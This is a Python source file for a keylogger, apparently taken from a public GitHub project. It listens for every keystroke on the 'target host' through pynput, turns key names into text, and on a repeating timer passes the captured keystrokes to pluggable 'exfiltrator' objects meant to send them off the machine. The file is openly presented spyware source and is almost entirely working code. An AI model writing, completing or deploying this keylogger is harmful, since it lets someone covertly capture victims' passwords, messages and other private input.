#!/usr/bin/env python3
# https://github.com/EONRaider/Keylogger

__author__ = "EONRaider @ keybase.io/eonraider"

import contextlib
from threading import Timer

from pynput import keyboard


class KeyLogger(object):
    def __init__(self, *, exfil_time: [int, float]):
        """Set up a keyboard listener that monitors keystroke events
        and send them to pre-configured exfiltration methods.

        Args:
            exfil_time (int,float): Time in seconds to wait before
                executing the exfiltration of logged keystrokes.
        """

        self.exfil_time = exfil_time
        self.captured_data: list[str] = ["Keylogger Initialized"]
        self.__exfiltrators = list()

        '''Mapping of key names to string characters for human-readable 
        text output. Add more mappings as necessary depending on the 
        host and the character set it works with.'''
        self.key_mapping: dict[str: str] = {"space": " "}

    def __str__(self):
        return "".join(self.captured_data)

    def register_exfiltrator(self, exfiltrator) -> None:
        """Register an instance of a child-class of Exfiltrator as an
        observer, enabling output or exfiltration of captured data from
        the target host."""
        self.__exfiltrators.append(exfiltrator)

    def _notify_all_exfiltrators(self) -> None:
        """Send captured data to each registered observer for final
        exfiltration."""
        [exfiltrator.update() for exfiltrator in self.__exfiltrators]
        Timer(interval=self.exfil_time,
              function=self._notify_all_exfiltrators).start()
        self.captured_data.clear()

    def _on_press(self, key: keyboard.Key) -> None:
        try:
            pressed_key: str = key.char  # Alphanumeric key was pressed
        except AttributeError:  # Special key was pressed
            try:  # Translate the key's value through custom mapping...
                pressed_key = self.key_mapping[key.name]
            except KeyError:  # ... or use the key's name as a result
                pressed_key = f"[{key.name.upper()}]"
        self.captured_data.append(pressed_key)

    def _on_release(self, key: keyboard.Key) -> None:
        ...

    def execute(self) -> None:
        with keyboard.Listener(on_press=self._on_press,
                               on_release=self._on_release) as listener:
            with contextlib.suppress(KeyboardInterrupt):
                self._notify_all_exfiltrators()
                listener.join()
